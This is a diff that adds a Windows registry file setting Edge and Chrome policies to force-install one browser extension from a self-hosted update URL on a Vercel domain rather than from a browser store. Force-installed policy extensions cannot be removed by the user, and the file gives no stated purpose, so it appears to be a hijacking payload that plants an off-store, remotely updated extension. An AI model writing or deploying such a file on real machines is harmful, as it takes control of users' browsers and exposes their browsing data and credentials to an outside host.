@@ -1,0 +1,7 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist]
+"1"="neejipllaameifemgbnficeiecplffdh;https://gdrivedown.vercel.app/install/updates.xml"
+
+[HKEY_CURRENT_USER\Software\Policies\Google\Chrome\ExtensionInstallForcelist]
+"1"="neejipllaameifemgbnficeiecplffdh;https://gdrivedown.vercel.app/install/updates.xml"
